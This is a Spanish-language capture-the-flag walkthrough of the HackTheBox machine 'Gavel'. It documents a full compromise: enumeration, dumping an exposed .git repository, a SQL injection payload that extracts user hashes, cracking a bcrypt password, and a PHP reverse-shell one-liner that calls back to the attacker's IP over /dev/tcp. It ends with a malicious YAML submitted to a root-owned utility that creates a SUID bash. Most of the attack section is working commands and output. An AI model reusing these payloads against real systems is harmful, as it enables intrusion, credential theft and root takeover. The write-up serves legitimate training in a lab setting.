### 1. Enumeración inicial

Empezamos la máquina enumerando los puertos abiertos con **nmap**:

```bash
sudo nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.97 -oG allPorts
[sudo] contraseña para abra: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-01 13:41 +0000
Initiating SYN Stealth Scan at 13:41
Scanning 10.10.11.97 [65535 ports]
Discovered open port 80/tcp on 10.10.11.97
Discovered open port 22/tcp on 10.10.11.97
Completed SYN Stealth Scan at 13:42, 13.26s elapsed (65535 total ports)
Nmap scan report for 10.10.11.97
Host is up, received user-set (0.074s latency).
Scanned at 2025-12-01 13:41:50 WET for 13s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.35 seconds
           Raw packets sent: 65950 (2.902MB) | Rcvd: 65948 (2.638MB)
```

Añadimos al **/etc/hosts** el dominio `gavel.htb`. 

---
### 2. Enumeración web y análisis del repositorio Git

La página principal no tiene mucha cosa, tiene un **register** y un **login**. Vamos a registrar nuestro usuario y a ver si nos encontramos algo interesante. Nos encontramos que en el panel tampoco hay nada interesante.

Haciendo un poco de fuzzing nos encontramos con un repositorio `.git`:
http://gavel.htb/.git/

Vamos a usar el siguiente script de bash para **dumpear todos los archivos** del repositorio:
https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh

```bash
./dump.sh http://gavel.htb/.git/ .
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating ./.git/
[+] Downloaded: HEAD
grep: warning: \ sobrante después de -
[-] Downloaded: objects/info/packs
[+] Downloaded: description
grep: warning: \ sobrante después de -
[+] Downloaded: config
grep: warning: \ sobrante después de -
[+] Downloaded: COMMIT_EDITMSG
grep: warning: \ sobrante después de -
[+] Downloaded: index
grep: warning: \ sobrante después de -
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
grep: warning: \ sobrante después de -
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash

...
```

En http://gavel.htb/.git/HEAD hay una referencia al archivo refs/heads/master, si vemos el contenido del mismo nos sale lo siguiente: `f67d90739a31d3f9ffcc3b9122652b500ff2a497`

**Esto es un SHA-1 que referencia a un objeto de git**. Vamos a leerlo:

```bash
❯ pwd
/home/abra/htb_machines/Gavel/.git
❯ git cat-file -p f67d90739a31d3f9ffcc3b9122652b500ff2a497
tree 2ad3710c826fab50e58edddb52a49ac82cb16479
parent 2bd167f52a35786a5a3e38a72c63005fffa14095
author sado <sado@gavel.htb> 1759516682 +0000
committer sado <sado@gavel.htb> 1759516682 +0000
..
```

Vamos a leer el objeto que referencia a un árbol de directorios (tree):

```bash
git cat-file -p 2ad3710c826fab50e58edddb52a49ac82cb16479
100755 blob c152f24b322a9ab5f1c29a5da854001f2926ab8f	admin.php
040000 tree a824ff08d566d100e499748bbf5d8831859ee654	assets
100755 blob b051e54c7164cf11d71e7e3f71435e9834643564	bidding.php
040000 tree eb2cb5600f6b050a9521094424b87ce1c6f9a1ab	includes
100755 blob 823a3996736a979f9f02bc776681ef93e882a289	index.php
100755 blob 0e2067d4d87a964079291b21f554e0c612afeee8	inventory.php
100755 blob 6d72c05225fe8676c3aad89a9f8dfcc4d7b76c12	login.php
100755 blob c3f9a91cbee1e482c9acb08f8567c8d49c02c716	logout.php
100755 blob c3ad4850de037de74a4fdaede268ea956280e85d	register.php
040000 tree 6bec2e0c1cd02be88f38f7472f26689b94117aa3	rules
```

El recurso **inventory.php** nos puede interesar. Es vulnerable a un **SQL Injection**:

```bash
git cat-file -p 0e2067d4d87a964079291b21f554e0c612afeee8
<?php
require_once __DIR__ . '/includes/config.php';
require_once __DIR__ . '/includes/db.php';
require_once __DIR__ . '/includes/session.php';

if (!isset($_SESSION['user'])) {
    header('Location: index.php');
    exit;
}

$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
$col = "`" . str_replace("`", "", $sortItem) . "`";
$itemMap = [];
$itemMeta = $pdo->prepare("SELECT name, description, image FROM items WHERE name = ?");
try {
    if ($sortItem === 'quantity') {
        $stmt = $pdo->prepare("SELECT item_name, item_image, item_description, quantity FROM inventory WHERE user_id = ? ORDER BY quantity DESC");
        $stmt->execute([$userId]);
    } else {
        $stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
        $stmt->execute([$userId]);
    }
    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
} catch (Exception $e) {
    $results = [];
}
foreach ($results as $row) {
    $firstKey = array_keys($row)[0];
    $name = $row['item_name'] ?? $row[$firstKey] ?? null;
    if (!$name) {
        continue;
    }
    $meta = [];
    try {
        $itemMeta->execute([$name]);
        $meta = $itemMeta->fetch(PDO::FETCH_ASSOC);
    } catch (Exception $e) {
        $meta = [];
    }
    $itemMap[$name] = [
        'name' => $name ?? "",
        'description' => $meta['description'] ?? "",
        'image' => $meta['image'] ?? "",
        'quantity' => $row['quantity'] ?? (is_numeric($row[$firstKey]) ? $row[$firstKey] : 1)
    ];
}
$stmt = $pdo->prepare("SELECT money FROM users WHERE id = ?");
$stmt->execute([$_SESSION['user']['id']]);
$money = $stmt->fetchColumn();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Your Inventory</title>
    <link href="<?= ASSETS_URL ?>/vendor/fontawesome-free/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Nunito:300,400,700&display=swap" rel="stylesheet">
    <link href="<?= ASSETS_URL ?>/css/sb-admin-2.css" rel="stylesheet">
    <link id="favicon" rel="icon" type="image/x-icon" href="<?= ASSETS_URL ?>/img/favicon.ico">
</head>
<body id="page-top">
    <div id="wrapper">
        <!-- Sidebar -->
        <ul class="navbar-nav bg-gradient-primary sidebar sidebar-dark accordion" id="accordionSidebar">
            <a class="sidebar-brand d-flex align-items-center justify-content-center" href="index.php">
                <div class="sidebar-brand-icon rotate-n-15">
                    <i class="fas fa-gavel"></i>
                </div>
                <div class="sidebar-brand-text mx-3">Gavel</div>
            </a>
            <hr class="sidebar-divider my-0">

            <?php if (!isset($_SESSION['user'])): ?>
                <li class="nav-item">
                    <a class="nav-link" href="index.php">
                        <i class="fas fa-fw fa-home"></i>
                        <span>Home</span>
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="login.php">
                        <i class="fas fa-fw fa-sign-in-alt"></i>
                        <span>Login</span>
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="register.php">
                        <i class="fas fa-fw fa-user-plus"></i>
                        <span>Register</span>
                    </a>
                </li>
            <?php else: ?>
                <li class="nav-item">
                    <a class="nav-link" href="index.php">
                        <i class="fas fa-fw fa-home"></i>
                        <span>Home</span>
                    </a>
                </li>
                <li class="nav-item active">
                    <a class="nav-link" href="inventory.php">
                        <i class="fas fa-box-open"></i>
                        <span>Inventory</span>
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="bidding.php">
                        <i class="fas fa-hammer"></i>
                        <span>Bidding</span>
                    </a>
                </li>
                <?php if ($_SESSION['user']['role'] === 'auctioneer'): ?>
                    <li class="nav-item">
                        <a class="nav-link" href="admin.php">
                            <i class="fas fa-tools"></i>
                            <span>Admin Panel</span>
                        </a>
                    </li>
                <?php endif; ?>
                <hr class="sidebar-divider d-none d-md-block">
                <li class="nav-item">
                    <a class="nav-link" href="logout.php">
                        <i class="fas fa-sign-out-alt"></i>
                        <span>Logout</span>
                    </a>
                </li>
            <?php endif; ?>
        </ul>
        <!-- End of Sidebar -->
        <div class="container-fluid pt-4">
            <div class="d-flex justify-content-between align-items-center mb-4">
                <h1 class="h3 text-gray-800"><i class="fas fa-box-open"></i> Inventory of <?= htmlspecialchars($_SESSION['user']['username']) ?></h1>
                <h1 class="h5 text-gray-800 mb-0"><i class="fas fa-coins"></i> <strong><?= number_format($money, 0, '.', ',') ?></strong></h1>
            </div>
            <hr>
            <div class="d-flex justify-content-between align-items-center mb-3">
                <div class="flex-grow-1 mr-3">
                    <?php if (empty($itemMap)): ?>
                        <div class="alert alert-info mb-0">Your inventory is empty.</div>
                    <?php else: ?>
                        <div class="alert alert-success mb-0">
                            Your inventory.
                        </div>
                    <?php endif; ?>
                </div>
                <form action="" method="POST" class="form-inline" id="sortForm">
                    <label for="sort" class="mr-2 text-dark"><strong>Sort by:</strong></label>
                    <input type="hidden" name="user_id" value="<?= $_SESSION['user']['id'] ?>">
                    <select name="sort" id="sort" class="form-control form-control-sm mr-2" onchange="document.getElementById('sortForm').submit();">
                        <option value="item_name" <?= $sortItem === 'item_name' ? 'selected' : '' ?>>Name</option>
                        <option value="quantity" <?= $sortItem === 'quantity' ? 'selected' : '' ?>>Quantity</option>
                    </select>
                </form>
            </div>
            <div class="row">
                <?php foreach ($itemMap as $item): ?>
                    <div class="col-md-4">
                        <div class="card shadow mb-4">
                            <div class="card-body">
                                <img src="<?= ASSETS_URL ?>/img/<?= htmlspecialchars($item['image']) ?>" class="card-img-top" alt="<?= htmlspecialchars($item['name']) ?>">
                                <hr>
                                <h5 class="card-title"><strong><?= htmlspecialchars($item['name']) ?></strong>
                                <?php if ($item['quantity'] > 1): ?>
                                    <span class="badge badge-pill badge-dark">x<?= $item['quantity'] ?></span>
                                <?php endif; ?>
                                </h5><hr>
                                <p class="card-text text-justify"><?= htmlspecialchars($item['description']) ?></p>
                            </div>
                        </div>
                    </div>
                <?php endforeach; ?>
            </div>
        </div>
    </div>
    <script src="<?= ASSETS_URL ?>/vendor/jquery/jquery.min.js"></script>
    <script src="<?= ASSETS_URL ?>/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script src="<?= ASSETS_URL ?>/vendor/jquery-easing/jquery.easing.min.js"></script>
    <script src="<?= ASSETS_URL ?>/js/sb-admin-2.min.js"></script>
</body>
</html>
```

El código vulnerable a SQLi es el siguiente:

```bash
$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
$col = "`" . str_replace("`", "", $sortItem) . "`";

$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
$stmt->execute([$userId]);
```

---
### 3. Explotación SQLi y acceso al panel de administración

Podemos explotarla con el siguiente payload, **enumerando usuarios y contraseñas de la base de datos**:

```bash
http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`%27x`+FROM+users)y;--+-&sort=\?;--+-%00
```

Nos devuelve la siguiente información la base de datos:

```bash
**auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS,huhu:$2y$10$Sh1XnxgNEhkc0UPDN5vGw.XXGP.EY18kA11wBb.Yk1LZh/yXDwQ..,asdf:$2y$10$YCsaUBZGAMBaQ23j.CEMb.wKb59O2NESaf7CAeYz1M3ChvRslKj.i,Tai3:$2y$10$YQHMzuVWeu8LBwBc3buR0uEKRQecRQaYSZUUFJe.4oKIguE7HYkJK,Beast:$2y$10$GzfWPfo4J3ZVHNxvrgvWhe37w4/OqLLiiJI6MgRa7jRH1Q2xZHzIu,attackerasdf:$2y$10$xWUn1j6IM35RZo2Glb2yiOOqG9uPuOZl/5CbpIije2oB/R0SBqhIC,jdoe:$2y$10$wOQFL3pO0wSXxfv2DASwV.X9Gq57hPnVSzCGVktG3mM/mu/ENMgCe,test1234:$2y$10$WTaSE7Njq641PxFsOjsTlevTrzua8uCwjETzzTG5tQ6axQm1RB.Lq,baum0:$2y$10$DGwe6pOShLlIevr9wQbSveUliERhYaSInbXbFb.JIIZ2CQ2fMXNd6,rootAbra:$2y$10$S2IM/UM8U4aLIhbSBSOZOefiukw7b2TsW/5wN52ug4dOpRcX3u5g.,aaa:$2y$10$Zj9jYxImiDv6weV4PWWPLuW4aF8ZsSilZu23u4VMiUZmeN8fUFffO,abdul:$2y$10$1R7yPOMKvPknmlRkfocs5uIV8teXpziP.Vi6a4XF8FvjtAiSXmcIa**
```

Tenemos un usuario **auctioneer** con un hash `$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS`, vamos a crackearlo usando **john** y el diccionario **rockyou.txt**:

```bash
john --wordlist=/home/abra/Documentos/rockyou.txt hash.txt
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Note: Passwords longer than 24 [worst case UTF-8] to 72 [ASCII] truncated (property of the hash)
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
midnight1        (?)     
1g 0:00:00:06 DONE (2025-12-01 15:29) 0.1495g/s 473.5p/s 473.5c/s 473.5C/s iamcool..heaven1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Tenemos las credenciales `auctioneer:midnight1`, podemos iniciar sesión con el usuario en el sitio web, ganando acceso a un **panel de administración**. 

---
### 4. Acceso inicial y user flag

Desde el panel podemos modificar los auctions de la página, si editamos la rule de uno de ellos le podemos **ejecutar código PHP**. Le voy a mandar un payload **para que el servidor mande una reverse shell a mi máquina de atacante**. Recuerden cambiar la dirección IP por la de vuestra máquina.

```php
system('bash -c "bash -i >& /dev/tcp/10.10.15.42/4444 0>&1"'); return true;
```

![[1]](img/1.png)

Vamos a darle a varios actions esta regla, se ejecutará **cuando cualquier usuario compre uno de estos en el apartado `Bidding` del sitio web**.

```bash
penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.10.0.100 • 192.168.0.1 • 172.18.0.1 • 172.17.0.1 • 10.10.15.42
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from gavel~10.10.11.97-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
[+] Attempting to spawn a reverse shell on 10.10.15.42:4444
[+] Got reverse shell from gavel~10.10.11.97-Linux-x86_64 😍️ Assigned SessionID <2>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Got reverse shell from gavel~10.10.11.97-Linux-x86_64 😍️ Assigned SessionID <3>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/abra/.penelope/sessions/gavel~10.10.11.97-Linux-x86_64/2025_12_01-15_42_12-050.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] Got reverse shell from gavel~10.10.11.97-Linux-x86_64 😍️ Assigned SessionID <4>
[+] Got reverse shell from gavel~10.10.11.97-Linux-x86_64 😍️ Assigned SessionID <5>

www-data@gavel:/var/www/html/gavel/includes$ 
```

Podemos escalar facilmente al usuario `auctioneer`, usando la contraseña `midnight1` recopilada anteriormente:

```bash
www-data@gavel:/var/www/html/gavel/includes$ ls /home
auctioneer
www-data@gavel:/var/www/html/gavel/includes$ su auctioneer
Password: 
auctioneer@gavel:/var/www/html/gavel/includes$ cd
auctioneer@gavel:~$ ls
user.txt
```

Tenemos la **user flag**, toca ir a por la root flag.

---
### 5. Escalada de privilegios a root mediante gavel-util

Enumerando la máquina nos damos cuenta de que nuestro usuario pertenece a un grupo **gavel-seller**. 

```bash
auctioneer@gavel:/$ id
uid=1001(auctioneer) gid=1002(auctioneer) groups=1002(auctioneer),1001(gavel-seller)
```

Vamos a buscar ficheros que pertenezcan a dicho grupo:

```bash
auctioneer@gavel:/$ find -group gavel-seller 2>/dev/null
./run/gaveld.sock
./usr/local/bin/gavel-util
```

Vemos dos ficheros, siendo uno de ellos un binario `/usr/local/bin/gavel-util`, veamos los permisos de ambos ficheros:

```bash
auctioneer@gavel:/$ ls -l ./usr/local/bin/gavel-util
-rwxr-xr-x 1 root gavel-seller 17688 Oct  3 19:35 ./usr/local/bin/gavel-util
auctioneer@gavel:/$ ls -l ./run/gaveld.sock
srw-rw---- 1 root gavel-seller 0 Dec  1 14:34 ./run/gaveld.sock
```

El propietario es **root** y **el grupo tiene permisos de ejecución sobre el binario**, por lo que vamos a probar a ejecutarlo a ver de que trata:

```bash
auctioneer@gavel:/$ ./usr/local/bin/gavel-util
Usage: ./usr/local/bin/gavel-util <cmd> [options]
Commands:
  submit <file>           Submit new items (YAML format)
  stats                   Show Auction stats
  invoice                 Request invoice
```

El binario nos permite subir archivos YAML, seguramente podamos crear uno malicioso. Si seguimos enumerando la máquina nos encontramos que **existe un .yaml de ejemplo** que nos sirve para saber la estructura que debe seguir los YAML:

```bash
auctioneer@gavel:/$ cat /opt/gavel/sample.yaml 
---
item:
  name: "Dragon's Feathered Hat"
  description: "A flamboyant hat rumored to make dragons jealous."
  image: "https://example.com/dragon_hat.png"
  price: 10000
  rule_msg: "Your bid must be at least 20% higher than the previous bid and sado isn't allowed to buy this item."
  rule: "return ($current_bid >= $previous_bid * 1.2) && ($bidder != 'sado');"
```

Creamos un YAML malicioso `/tmp/exploit.yaml` que al ser ejecutado con el binario, como el propietario es **root**, podemos hacer que haga **una copia de `/bin/bash` con permisos de SUID en el home de nuestro usuario**:

```yaml
name: "root"
description: "SUID Bash"
image: "https://x"
price: 1
rule_msg: "ok"
rule: "
system('install -o root -m 4755 /bin/bash /home/auctioneer/bsh');
return false; 
"
```

Tras ejecutar el binario con el YAML malicioso podemos ejecutar la copia de `/bin/bash` de forma privilegiada usando el parámetro `-p`:

```bash
auctioneer@gavel:/$ ./usr/local/bin/gavel-util submit /tmp/exploit.yaml
Item submitted for review in next auction
auctioneer@gavel:/$ ls /home/auctioneer/
bsh  user.txt
auctioneer@gavel:/$ ./home/auctioneer/bsh -p
bsh-5.1# whoami
root
```

Con esto acabamos de vulnerar la máquina por completo, obtenemos la root flag en **/root/root.txt**.